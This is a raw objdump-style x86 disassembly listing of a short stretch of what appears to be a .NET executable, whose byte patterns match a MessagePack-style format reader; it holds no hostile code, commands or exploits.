  404c3e:	26 00 00             	add    %al,%es:(%eax)
  404c41:	0a 0b                	or     (%ebx),%cl
  404c43:	14 0c                	adc    $0xc,%al
  404c45:	07                   	pop    %es
  404c46:	8e 3a                	mov    (%edx),%?
  404c48:	02 00                	add    (%eax),%al
  404c4a:	00 00                	add    %al,(%eax)
  404c4c:	14 2a                	adc    $0x2a,%al
  404c4e:	07                   	pop    %es
  404c4f:	8e 69 17             	mov    0x17(%ecx),%gs
  404c52:	3e 41                	ds inc %ecx
  404c54:	00 00                	add    %al,(%eax)
  404c56:	00 16                	add    %dl,(%esi)
  404c58:	0d 38 32 00 00       	or     $0x3238,%eax
  404c5d:	00 07                	add    %al,(%edi)
  404c5f:	09 a3 38 00 00 01    	or     %esp,0x1000038(%ebx)
  404c65:	0c 06                	or     $0x6,%al
  404c67:	08 6f 6e             	or     %ch,0x6e(%edi)
  404c6a:	00 00                	add    %al,(%eax)
  404c6c:	06                   	push   %es
  404c6d:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404c70:	04 3a                	add    $0x3a,%al
  404c72:	13 00                	adc    (%eax),%eax
  404c74:	00 00                	add    %al,(%eax)
  404c76:	06                   	push   %es
  404c77:	6f                   	outsl  %ds:(%esi),(%dx)
  404c78:	6f                   	outsl  %ds:(%esi),(%dx)
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	06                   	push   %es
  404c7c:	0a 06                	or     (%esi),%al
  404c7e:	08 6f 6a             	or     %ch,0x6a(%edi)
  404c81:	00 00                	add    %al,(%eax)
  404c83:	06                   	push   %es
  404c84:	38 03                	cmp    %al,(%ebx)
  404c86:	00 00                	add    %al,(%eax)
  404c88:	00 11                	add    %dl,(%ecx)
  404c8a:	04 0a                	add    $0xa,%al
  404c8c:	09 17                	or     %edx,(%edi)
  404c8e:	58                   	pop    %eax
  404c8f:	0d 09 07 8e 69       	or     $0x698e0709,%eax
  404c94:	17                   	pop    %ss
  404c95:	59                   	pop    %ecx
  404c96:	32 c6                	xor    %dh,%al
  404c98:	07                   	pop    %es
  404c99:	07                   	pop    %es
  404c9a:	8e 69 17             	mov    0x17(%ecx),%gs
  404c9d:	59                   	pop    %ecx
  404c9e:	a3 38 00 00 01       	mov    %eax,0x1000038
  404ca3:	0c 06                	or     $0x6,%al
  404ca5:	08 6f 6d             	or     %ch,0x6d(%edi)
  404ca8:	00 00                	add    %al,(%eax)
  404caa:	06                   	push   %es
  404cab:	13 05 11 05 15 3e    	adc    0x3e150511,%eax
  404cb1:	0e                   	push   %cs
  404cb2:	00 00                	add    %al,(%eax)
  404cb4:	00 06                	add    %al,(%esi)
  404cb6:	7b 38                	jnp    0x404cf0
  404cb8:	00 00                	add    %al,(%eax)
  404cba:	04 11                	add    $0x11,%al
  404cbc:	05 6f ea 00 00       	add    $0xea6f,%eax
  404cc1:	0a 2a                	or     (%edx),%ch
  404cc3:	06                   	push   %es
  404cc4:	6f                   	outsl  %ds:(%esi),(%dx)
  404cc5:	6f                   	outsl  %ds:(%esi),(%dx)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	06                   	push   %es
  404cc9:	0a 06                	or     (%esi),%al
  404ccb:	08 6f 6a             	or     %ch,0x6a(%edi)
  404cce:	00 00                	add    %al,(%eax)
  404cd0:	06                   	push   %es
  404cd1:	06                   	push   %es
  404cd2:	2a 00                	sub    (%eax),%al
  404cd4:	1b 30                	sbb    (%eax),%esi
  404cd6:	04 00                	add    $0x0,%al
  404cd8:	3b 00                	cmp    (%eax),%eax
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	24 00                	and    $0x0,%al
  404cde:	00 11                	add    %dl,(%ecx)
  404ce0:	73 d0                	jae    0x404cb2
  404ce2:	00 00                	add    %al,(%eax)
  404ce4:	0a 0a                	or     (%edx),%cl
  404ce6:	03 28                	add    (%eax),%ebp
  404ce8:	a2 00 00 06 10       	mov    %al,0x10060000
  404ced:	01 06                	add    %eax,(%esi)
  404cef:	03 16                	add    (%esi),%edx
  404cf1:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404cf7:	00 0a                	add    %cl,(%edx)
  404cf9:	06                   	push   %es
  404cfa:	16                   	push   %ss
  404cfb:	6a 6f                	push   $0x6f
  404cfd:	4e                   	dec    %esi
  404cfe:	00 00                	add    %al,(%eax)
  404d00:	0a 02                	or     (%edx),%al
  404d02:	06                   	push   %es
  404d03:	28 88 00 00 06 dd    	sub    %cl,-0x22fa0000(%eax)
  404d09:	0d 00 00 00 06       	or     $0x6000000,%eax
  404d0e:	39 06                	cmp    %eax,(%esi)
  404d10:	00 00                	add    %al,(%eax)
  404d12:	00 06                	add    %al,(%esi)
  404d14:	6f                   	outsl  %ds:(%esi),(%dx)
  404d15:	33 00                	xor    (%eax),%eax
  404d17:	00 0a                	add    %cl,(%edx)
  404d19:	dc 2a                	fsubrl (%edx)
  404d1b:	00 01                	add    %al,(%ecx)
  404d1d:	10 00                	adc    %al,(%eax)
  404d1f:	00 02                	add    %al,(%edx)
  404d21:	00 06                	add    %al,(%esi)
  404d23:	00 27                	add    %ah,(%edi)
  404d25:	2d 00 0d 00 00       	sub    $0xd00,%eax
  404d2a:	00 00                	add    %al,(%eax)
  404d2c:	13 30                	adc    (%eax),%esi
  404d2e:	02 00                	add    (%eax),%al
  404d30:	16                   	push   %ss
  404d31:	00 00                	add    %al,(%eax)
  404d33:	00 25 00 00 11 03    	add    %ah,0x3110000
  404d39:	19 73 6c             	sbb    %esi,0x6c(%ebx)
  404d3c:	00 00                	add    %al,(%eax)
  404d3e:	0a 0a                	or     (%edx),%cl
  404d40:	02 06                	add    (%esi),%al
  404d42:	28 88 00 00 06 06    	sub    %cl,0x6060000(%eax)
  404d48:	6f                   	outsl  %ds:(%esi),(%dx)
  404d49:	40                   	inc    %eax
  404d4a:	00 00                	add    %al,(%eax)
  404d4c:	0a 2a                	or     (%edx),%ch
  404d4e:	00 00                	add    %al,(%eax)
  404d50:	13 30                	adc    (%eax),%esi
  404d52:	04 00                	add    $0x0,%al
  404d54:	07                   	pop    %es
  404d55:	06                   	push   %es
  404d56:	00 00                	add    %al,(%eax)
  404d58:	26 00 00             	add    %al,%es:(%eax)
  404d5b:	11 03                	adc    %eax,(%ebx)
  404d5d:	6f                   	outsl  %ds:(%esi),(%dx)
  404d5e:	00 01                	add    %al,(%ecx)
  404d60:	00 0a                	add    %cl,(%edx)
  404d62:	d2 0a                	rorb   %cl,(%edx)
  404d64:	14 0b                	adc    $0xb,%al
  404d66:	16                   	push   %ss
  404d67:	0c 16                	or     $0x16,%al
  404d69:	0d 06 1f 7f 3d       	or     $0x3d7f1f06,%eax
  404d6e:	09 00                	or     %eax,(%eax)
  404d70:	00 00                	add    %al,(%eax)
  404d72:	02 06                	add    (%esi),%al
  404d74:	6e                   	outsb  %ds:(%esi),(%dx)
  404d75:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  404d79:	06                   	push   %es
  404d7a:	2a 06                	sub    (%esi),%al
  404d7c:	20 80 00 00 00 3f    	and    %al,0x3f000000(%eax)
  404d82:	48                   	dec    %eax
  404d83:	00 00                	add    %al,(%eax)
  404d85:	00 06                	add    %al,(%esi)
  404d87:	20 8f 00 00 00 3d    	and    %cl,0x3d000000(%edi)
  404d8d:	3d 00 00 00 02       	cmp    $0x2000000,%eax
  404d92:	28 6b 00             	sub    %ch,0x0(%ebx)
  404d95:	00 06                	add    %al,(%esi)
  404d97:	02 18                	add    (%eax),%bl
  404d99:	7d 36                	jge    0x404dd1
  404d9b:	00 00                	add    %al,(%eax)
  404d9d:	04 06                	add    $0x6,%al
  404d9f:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  404da5:	0c 16                	or     $0x16,%al
  404da7:	0d 38 1c 00 00       	or     $0x1c38,%eax
  404dac:	00 02                	add    %al,(%edx)
  404dae:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404db2:	06                   	push   %es
  404db3:	25 03 28 96 00       	and    $0x962803,%eax
  404db8:	00 06                	add    %al,(%esi)
  404dba:	6f                   	outsl  %ds:(%esi),(%dx)
  404dbb:	6a 00                	push   $0x0
  404dbd:	00 06                	add    %al,(%esi)
  404dbf:	03 6f 88             	add    -0x78(%edi),%ebp
  404dc2:	00 00                	add    %al,(%eax)
  404dc4:	06                   	push   %es
  404dc5:	09 17                	or     %edx,(%edi)
  404dc7:	58                   	pop    %eax
  404dc8:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  404dcd:	2a 06                	sub    (%esi),%al
  404dcf:	20 90 00 00 00 3f    	and    %dl,0x3f000000(%eax)
  404dd5:	3c 00                	cmp    $0x0,%al
  404dd7:	00 00                	add    %al,(%eax)
  404dd9:	06                   	push   %es
  404dda:	20 9f 00 00 00 3d    	and    %bl,0x3d000000(%edi)
  404de0:	31 00                	xor    %eax,(%eax)
  404de2:	00 00                	add    %al,(%eax)
  404de4:	02 28                	add    (%eax),%ch
  404de6:	6b 00 00             	imul   $0x0,(%eax),%eax
  404de9:	06                   	push   %es
  404dea:	02 19                	add    (%ecx),%bl
  404dec:	7d 36                	jge    0x404e24
  404dee:	00 00                	add    %al,(%eax)
  404df0:	04 06                	add    $0x6,%al
  404df2:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  404df8:	0c 16                	or     $0x16,%al
  404dfa:	0d 38 10 00 00       	or     $0x1038,%eax
  404dff:	00 02                	add    %al,(%edx)
  404e01:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404e05:	06                   	push   %es
  404e06:	03 6f 88             	add    -0x78(%edi),%ebp
  404e09:	00 00                	add    %al,(%eax)
  404e0b:	06                   	push   %es
  404e0c:	09 17                	or     %edx,(%edi)
  404e0e:	58                   	pop    %eax
  404e0f:	0d 09 08 32 ec       	or     $0xec320809,%eax
  404e14:	2a 06                	sub    (%esi),%al
  404e16:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  404e1c:	21 00                	and    %eax,(%eax)
  404e1e:	00 00                	add    %al,(%eax)
  404e20:	06                   	push   %es
  404e21:	20 bf 00 00 00 3d    	and    %bh,0x3d000000(%edi)
  404e27:	16                   	push   %ss
  404e28:	00 00                	add    %al,(%eax)
  404e2a:	00 06                	add    %al,(%esi)
  404e2c:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  404e32:	0c 02                	or     $0x2,%al
  404e34:	03 08                	add    (%eax),%ecx
  404e36:	28 95 00 00 06 28    	sub    %dl,0x28060000(%ebp)
  404e3c:	81 00 00 06 2a 06    	addl   $0x62a0600,(%eax)
  404e42:	20 e0                	and    %ah,%al
  404e44:	00 00                	add    %al,(%eax)
  404e46:	00 3f                	add    %bh,(%edi)
  404e48:	15 00 00 00 06       	adc    $0x6000000,%eax
  404e4d:	20 ff                	and    %bh,%bh
  404e4f:	00 00                	add    %al,(%eax)
  404e51:	00 3d 0a 00 00 00    	add    %bh,0xa
  404e57:	02 06                	add    (%esi),%al
  404e59:	67 6a 28             	addr16 push $0x28
  404e5c:	74 00                	je     0x404e5e
  404e5e:	00 06                	add    %al,(%esi)
  404e60:	2a 06                	sub    (%esi),%al
  404e62:	20 c0                	and    %al,%al
  404e64:	00 00                	add    %al,(%eax)
  404e66:	00 40 07             	add    %al,0x7(%eax)
  404e69:	00 00                	add    %al,(%eax)
  404e6b:	00 02                	add    %al,(%edx)
  404e6d:	28 80 00 00 06 2a    	sub    %al,0x2a060000(%eax)
  404e73:	06                   	push   %es
  404e74:	20 c1                	and    %al,%cl
  404e76:	00 00                	add    %al,(%eax)
  404e78:	00 40 0b             	add    %al,0xb(%eax)
  404e7b:	00 00                	add    %al,(%eax)
  404e7d:	00 72 56             	add    %dh,0x56(%edx)
  404e80:	27                   	daa
  404e81:	00 70 73             	add    %dh,0x73(%eax)
  404e84:	01 01                	add    %eax,(%ecx)
  404e86:	00 0a                	add    %cl,(%edx)
  404e88:	7a 06                	jp     0x404e90
  404e8a:	20 c2                	and    %al,%dl
  404e8c:	00 00                	add    %al,(%eax)
  404e8e:	00 40 08             	add    %al,0x8(%eax)
  404e91:	00 00                	add    %al,(%eax)
  404e93:	00 02                	add    %al,(%edx)
  404e95:	16                   	push   %ss
  404e96:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404e9c:	06                   	push   %es
  404e9d:	20 c3                	and    %al,%bl
  404e9f:	00 00                	add    %al,(%eax)
  404ea1:	00 40 08             	add    %al,0x8(%eax)
  404ea4:	00 00                	add    %al,(%eax)
  404ea6:	00 02                	add    %al,(%edx)
  404ea8:	17                   	pop    %ss
  404ea9:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404eaf:	06                   	push   %es
  404eb0:	20 c4                	and    %al,%ah
  404eb2:	00 00                	add    %al,(%eax)
  404eb4:	00 40 20             	add    %al,0x20(%eax)
  404eb7:	00 00                	add    %al,(%eax)
  404eb9:	00 03                	add    %al,(%ebx)
  404ebb:	6f                   	outsl  %ds:(%esi),(%dx)
  404ebc:	00 01                	add    %al,(%ecx)
  404ebe:	00 0a                	add    %cl,(%edx)
  404ec0:	0c 08                	or     $0x8,%al
  404ec2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ec6:	01 0b                	add    %ecx,(%ebx)
  404ec8:	03 07                	add    (%edi),%eax
  404eca:	16                   	push   %ss
  404ecb:	08 6f 45             	or     %ch,0x45(%edi)
  404ece:	00 00                	add    %al,(%eax)
  404ed0:	0a 26                	or     (%esi),%ah
  404ed2:	02 07                	add    (%edi),%al
  404ed4:	28 79 00             	sub    %bh,0x0(%ecx)
  404ed7:	00 06                	add    %al,(%esi)
  404ed9:	2a 06                	sub    (%esi),%al
  404edb:	20 c5                	and    %al,%ch
  404edd:	00 00                	add    %al,(%eax)
  404edf:	00 40 39             	add    %al,0x39(%eax)
  404ee2:	00 00                	add    %al,(%eax)
  404ee4:	00 18                	add    %bl,(%eax)
  404ee6:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404eea:	01 0b                	add    %ecx,(%ebx)
  404eec:	03 07                	add    (%edi),%eax
  404eee:	16                   	push   %ss
  404eef:	18 6f 45             	sbb    %ch,0x45(%edi)
  404ef2:	00 00                	add    %al,(%eax)
  404ef4:	0a 26                	or     (%esi),%ah
  404ef6:	07                   	pop    %es
  404ef7:	28 58 00             	sub    %bl,0x0(%eax)
  404efa:	00 06                	add    %al,(%esi)
  404efc:	0b 07                	or     (%edi),%eax
  404efe:	16                   	push   %ss
  404eff:	28 02                	sub    %al,(%edx)
  404f01:	01 00                	add    %eax,(%eax)
  404f03:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f06:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f0a:	01 0b                	add    %ecx,(%ebx)
  404f0c:	03 07                	add    (%edi),%eax
  404f0e:	16                   	push   %ss
  404f0f:	08 6f 45             	or     %ch,0x45(%edi)
  404f12:	00 00                	add    %al,(%eax)
  404f14:	0a 26                	or     (%esi),%ah
  404f16:	02 07                	add    (%edi),%al
  404f18:	28 79 00             	sub    %bh,0x0(%ecx)
  404f1b:	00 06                	add    %al,(%esi)
  404f1d:	2a 06                	sub    (%esi),%al
  404f1f:	20 c6                	and    %al,%dh
  404f21:	00 00                	add    %al,(%eax)
  404f23:	00 40 39             	add    %al,0x39(%eax)
  404f26:	00 00                	add    %al,(%eax)
  404f28:	00 1a                	add    %bl,(%edx)
  404f2a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f2e:	01 0b                	add    %ecx,(%ebx)
  404f30:	03 07                	add    (%edi),%eax
  404f32:	16                   	push   %ss
  404f33:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f36:	00 00                	add    %al,(%eax)
  404f38:	0a 26                	or     (%esi),%ah
  404f3a:	07                   	pop    %es
  404f3b:	28 58 00             	sub    %bl,0x0(%eax)
  404f3e:	00 06                	add    %al,(%esi)
  404f40:	0b 07                	or     (%edi),%eax
  404f42:	16                   	push   %ss
  404f43:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404f47:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f4a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f4e:	01 0b                	add    %ecx,(%ebx)
  404f50:	03 07                	add    (%edi),%eax
  404f52:	16                   	push   %ss
  404f53:	08 6f 45             	or     %ch,0x45(%edi)
  404f56:	00 00                	add    %al,(%eax)
  404f58:	0a 26                	or     (%esi),%ah
  404f5a:	02 07                	add    (%edi),%al
  404f5c:	28 79 00             	sub    %bh,0x0(%ecx)
  404f5f:	00 06                	add    %al,(%esi)
  404f61:	2a 06                	sub    (%esi),%al
  404f63:	20 c7                	and    %al,%bh
  404f65:	00 00                	add    %al,(%eax)
  404f67:	00 3b                	add    %bh,(%ebx)
  404f69:	16                   	push   %ss
  404f6a:	00 00                	add    %al,(%eax)
  404f6c:	00 06                	add    %al,(%esi)
  404f6e:	20 c8                	and    %cl,%al
  404f70:	00 00                	add    %al,(%eax)
  404f72:	00 3b                	add    %bh,(%ebx)
  404f74:	0b 00                	or     (%eax),%eax
  404f76:	00 00                	add    %al,(%eax)
  404f78:	06                   	push   %es
  404f79:	20 c9                	and    %cl,%cl
  404f7b:	00 00                	add    %al,(%eax)
  404f7d:	00 40 0b             	add    %al,0xb(%eax)
  404f80:	00 00                	add    %al,(%eax)
  404f82:	00 72 82             	add    %dh,-0x7e(%edx)
  404f85:	27                   	daa
  404f86:	00 70 73             	add    %dh,0x73(%eax)
  404f89:	01 01                	add    %eax,(%ecx)
  404f8b:	00 0a                	add    %cl,(%edx)
  404f8d:	7a 06                	jp     0x404f95
  404f8f:	20 ca                	and    %cl,%dl
  404f91:	00 00                	add    %al,(%eax)
  404f93:	00 40 26             	add    %al,0x26(%eax)
  404f96:	00 00                	add    %al,(%eax)
  404f98:	00 1a                	add    %bl,(%edx)
  404f9a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f9e:	01 0b                	add    %ecx,(%ebx)
  404fa0:	03 07                	add    (%edi),%eax
  404fa2:	16                   	push   %ss
  404fa3:	1a 6f 45             	sbb    0x45(%edi),%ch
  404fa6:	00 00                	add    %al,(%eax)
  404fa8:	0a 26                	or     (%esi),%ah
  404faa:	07                   	pop    %es
  404fab:	28 58 00             	sub    %bl,0x0(%eax)
  404fae:	00 06                	add    %al,(%esi)
  404fb0:	0b 02                	or     (%edx),%eax
  404fb2:	07                   	pop    %es
  404fb3:	16                   	push   %ss
  404fb4:	28 03                	sub    %al,(%ebx)
  404fb6:	01 00                	add    %eax,(%eax)
  404fb8:	0a 28                	or     (%eax),%ch
  404fba:	84 00                	test   %al,(%eax)
  404fbc:	00 06                	add    %al,(%esi)
  404fbe:	2a 06                	sub    (%esi),%al
  404fc0:	20 cb                	and    %cl,%bl
  404fc2:	00 00                	add    %al,(%eax)
  404fc4:	00 40 26             	add    %al,0x26(%eax)
  404fc7:	00 00                	add    %al,(%eax)
  404fc9:	00 1e                	add    %bl,(%esi)
  404fcb:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404fcf:	01 0b                	add    %ecx,(%ebx)
  404fd1:	03 07                	add    (%edi),%eax
  404fd3:	16                   	push   %ss
  404fd4:	1e                   	push   %ds
  404fd5:	6f                   	outsl  %ds:(%esi),(%dx)
  404fd6:	45                   	inc    %ebp
  404fd7:	00 00                	add    %al,(%eax)
  404fd9:	0a 26                	or     (%esi),%ah
  404fdb:	07                   	pop    %es
  404fdc:	28 58 00             	sub    %bl,0x0(%eax)
  404fdf:	00 06                	add    %al,(%esi)
  404fe1:	0b 02                	or     (%edx),%eax
  404fe3:	07                   	pop    %es
  404fe4:	16                   	push   %ss
  404fe5:	28 04 01             	sub    %al,(%ecx,%eax,1)
  404fe8:	00 0a                	add    %cl,(%edx)
  404fea:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  404ff0:	06                   	push   %es
  404ff1:	20 cc                	and    %cl,%ah
  404ff3:	00 00                	add    %al,(%eax)
  404ff5:	00 40 11             	add    %al,0x11(%eax)
  404ff8:	00 00                	add    %al,(%eax)
  404ffa:	00 03                	add    %al,(%ebx)
  404ffc:	6f                   	outsl  %ds:(%esi),(%dx)
  404ffd:	00 01                	add    %al,(%ecx)
  404fff:	00 0a                	add    %cl,(%edx)
  405001:	d2 0a                	rorb   %cl,(%edx)
  405003:	02 06                	add    (%esi),%al
  405005:	6e                   	outsb  %ds:(%esi),(%dx)
  405006:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  40500a:	06                   	push   %es
  40500b:	2a 06                	sub    (%esi),%al
  40500d:	20 cd                	and    %cl,%ch
  40500f:	00 00                	add    %al,(%eax)
  405011:	00 40 27             	add    %al,0x27(%eax)
  405014:	00 00                	add    %al,(%eax)
  405016:	00 18                	add    %bl,(%eax)
  405018:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40501c:	01 0b                	add    %ecx,(%ebx)
  40501e:	03 07                	add    (%edi),%eax
  405020:	16                   	push   %ss
  405021:	18 6f 45             	sbb    %ch,0x45(%edi)
  405024:	00 00                	add    %al,(%eax)
  405026:	0a 26                	or     (%esi),%ah
  405028:	07                   	pop    %es
  405029:	28 58 00             	sub    %bl,0x0(%eax)
  40502c:	00 06                	add    %al,(%esi)
  40502e:	0b 02                	or     (%edx),%eax
  405030:	07                   	pop    %es
  405031:	16                   	push   %ss
  405032:	28 02                	sub    %al,(%edx)
  405034:	01 00                	add    %eax,(%eax)
  405036:	0a 6e 28             	or     0x28(%esi),%ch
  405039:	74 00                	je     0x40503b
  40503b:	00 06                	add    %al,(%esi)
  40503d:	2a 06                	sub    (%esi),%al
  40503f:	20 ce                	and    %cl,%dh
  405041:	00 00                	add    %al,(%eax)
  405043:	00 40 27             	add    %al,0x27(%eax)
  405046:	00 00                	add    %al,(%eax)
  405048:	00 1a                	add    %bl,(%edx)
  40504a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40504e:	01 0b                	add    %ecx,(%ebx)
  405050:	03 07                	add    (%edi),%eax
  405052:	16                   	push   %ss
  405053:	1a 6f 45             	sbb    0x45(%edi),%ch
  405056:	00 00                	add    %al,(%eax)
  405058:	0a 26                	or     (%esi),%ah
  40505a:	07                   	pop    %es
  40505b:	28 58 00             	sub    %bl,0x0(%eax)
  40505e:	00 06                	add    %al,(%esi)
  405060:	0b 02                	or     (%edx),%eax
  405062:	07                   	pop    %es
  405063:	16                   	push   %ss
  405064:	28 05 01 00 0a 6e    	sub    %al,0x6e0a0001
  40506a:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  40506e:	06                   	push   %es
  40506f:	2a 06                	sub    (%esi),%al
  405071:	20 cf                	and    %cl,%bh
  405073:	00 00                	add    %al,(%eax)
  405075:	00 40 26             	add    %al,0x26(%eax)
  405078:	00 00                	add    %al,(%eax)
  40507a:	00 1e                	add    %bl,(%esi)
  40507c:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405080:	01 0b                	add    %ecx,(%ebx)
  405082:	03 07                	add    (%edi),%eax
  405084:	16                   	push   %ss
  405085:	1e                   	push   %ds
  405086:	6f                   	outsl  %ds:(%esi),(%dx)
  405087:	45                   	inc    %ebp
  405088:	00 00                	add    %al,(%eax)
  40508a:	0a 26                	or     (%esi),%ah
  40508c:	07                   	pop    %es
  40508d:	28 58 00             	sub    %bl,0x0(%eax)
  405090:	00 06                	add    %al,(%esi)
  405092:	0b 02                	or     (%edx),%eax
  405094:	07                   	pop    %es
  405095:	16                   	push   %ss
  405096:	28 06                	sub    %al,(%esi)
  405098:	01 00                	add    %eax,(%eax)
  40509a:	0a 28                	or     (%eax),%ch
  40509c:	75 00                	jne    0x40509e
  40509e:	00 06                	add    %al,(%esi)
  4050a0:	2a 06                	sub    (%esi),%al
  4050a2:	20 dc                	and    %bl,%ah
  4050a4:	00 00                	add    %al,(%eax)
  4050a6:	00 40 49             	add    %al,0x49(%eax)
  4050a9:	00 00                	add    %al,(%eax)
  4050ab:	00 18                	add    %bl,(%eax)
  4050ad:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050b1:	01 0b                	add    %ecx,(%ebx)
  4050b3:	03 07                	add    (%edi),%eax
  4050b5:	16                   	push   %ss
  4050b6:	18 6f 45             	sbb    %ch,0x45(%edi)
  4050b9:	00 00                	add    %al,(%eax)
  4050bb:	0a 26                	or     (%esi),%ah
  4050bd:	07                   	pop    %es
  4050be:	28 58 00             	sub    %bl,0x0(%eax)
  4050c1:	00 06                	add    %al,(%esi)
  4050c3:	0b 07                	or     (%edi),%eax
  4050c5:	16                   	push   %ss
  4050c6:	28 07                	sub    %al,(%edi)
  4050c8:	01 00                	add    %eax,(%eax)
  4050ca:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4050cd:	28 6b 00             	sub    %ch,0x0(%ebx)
  4050d0:	00 06                	add    %al,(%esi)
  4050d2:	02 19                	add    (%ecx),%bl
  4050d4:	7d 36                	jge    0x40510c
  4050d6:	00 00                	add    %al,(%eax)
  4050d8:	04 16                	add    $0x16,%al
  4050da:	0d 38 10 00 00       	or     $0x1038,%eax
  4050df:	00 02                	add    %al,(%edx)
  4050e1:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4050e5:	06                   	push   %es
  4050e6:	03 6f 88             	add    -0x78(%edi),%ebp
  4050e9:	00 00                	add    %al,(%eax)
  4050eb:	06                   	push   %es
  4050ec:	09 17                	or     %edx,(%edi)
  4050ee:	58                   	pop    %eax
  4050ef:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4050f4:	2a 06                	sub    (%esi),%al
  4050f6:	20 dd                	and    %bl,%ch
  4050f8:	00 00                	add    %al,(%eax)
  4050fa:	00 40 49             	add    %al,0x49(%eax)
  4050fd:	00 00                	add    %al,(%eax)
  4050ff:	00 1a                	add    %bl,(%edx)
  405101:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405105:	01 0b                	add    %ecx,(%ebx)
  405107:	03 07                	add    (%edi),%eax
  405109:	16                   	push   %ss
  40510a:	1a 6f 45             	sbb    0x45(%edi),%ch
  40510d:	00 00                	add    %al,(%eax)
  40510f:	0a 26                	or     (%esi),%ah
  405111:	07                   	pop    %es
  405112:	28 58 00             	sub    %bl,0x0(%eax)
  405115:	00 06                	add    %al,(%esi)
  405117:	0b 07                	or     (%edi),%eax
  405119:	16                   	push   %ss
  40511a:	28 07                	sub    %al,(%edi)
  40511c:	01 00                	add    %eax,(%eax)
  40511e:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405121:	28 6b 00             	sub    %ch,0x0(%ebx)
  405124:	00 06                	add    %al,(%esi)
  405126:	02 19                	add    (%ecx),%bl
  405128:	7d 36                	jge    0x405160
  40512a:	00 00                	add    %al,(%eax)
  40512c:	04 16                	add    $0x16,%al
  40512e:	0d 38 10 00 00       	or     $0x1038,%eax
  405133:	00 02                	add    %al,(%edx)
  405135:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405139:	06                   	push   %es
  40513a:	03 6f 88             	add    -0x78(%edi),%ebp
  40513d:	00 00                	add    %al,(%eax)
  40513f:	06                   	push   %es
  405140:	09 17                	or     %edx,(%edi)
  405142:	58                   	pop    %eax
  405143:	0d 09 08 32 ec       	or     $0xec320809,%eax
  405148:	2a 06                	sub    (%esi),%al
  40514a:	20 d9                	and    %bl,%cl
  40514c:	00 00                	add    %al,(%eax)
  40514e:	00 40 0e             	add    %al,0xe(%eax)
  405151:	00 00                	add    %al,(%eax)
  405153:	00 02                	add    %al,(%edx)
  405155:	06                   	push   %es
  405156:	03 28                	add    (%eax),%ebp
  405158:	97                   	xchg   %eax,%edi
  405159:	00 00                	add    %al,(%eax)
  40515b:	06                   	push   %es
  40515c:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  405162:	06                   	push   %es
  405163:	20 de                	and    %bl,%dh
  405165:	00 00                	add    %al,(%eax)
  405167:	00 40 55             	add    %al,0x55(%eax)
  40516a:	00 00                	add    %al,(%eax)
  40516c:	00 18                	add    %bl,(%eax)
  40516e:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405172:	01 0b                	add    %ecx,(%ebx)
  405174:	03 07                	add    (%edi),%eax
  405176:	16                   	push   %ss
  405177:	18 6f 45             	sbb    %ch,0x45(%edi)
  40517a:	00 00                	add    %al,(%eax)
  40517c:	0a 26                	or     (%esi),%ah
  40517e:	07                   	pop    %es
  40517f:	28 58 00             	sub    %bl,0x0(%eax)
  405182:	00 06                	add    %al,(%esi)
  405184:	0b 07                	or     (%edi),%eax
  405186:	16                   	push   %ss
  405187:	28 07                	sub    %al,(%edi)
  405189:	01 00                	add    %eax,(%eax)
  40518b:	0a 0c 02             	or     (%edx,%eax,1),%cl
  40518e:	28 6b 00             	sub    %ch,0x0(%ebx)
  405191:	00 06                	add    %al,(%esi)
  405193:	02 18                	add    (%eax),%bl
  405195:	7d 36                	jge    0x4051cd
  405197:	00 00                	add    %al,(%eax)
  405199:	04 16                	add    $0x16,%al
  40519b:	0d 38 1c 00 00       	or     $0x1c38,%eax
  4051a0:	00 02                	add    %al,(%edx)
  4051a2:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4051a6:	06                   	push   %es
  4051a7:	25 03 28 96 00       	and    $0x962803,%eax
  4051ac:	00 06                	add    %al,(%esi)
  4051ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4051af:	6a 00                	push   $0x0
  4051b1:	00 06                	add    %al,(%esi)
  4051b3:	03 6f 88             	add    -0x78(%edi),%ebp
  4051b6:	00 00                	add    %al,(%eax)
  4051b8:	06                   	push   %es
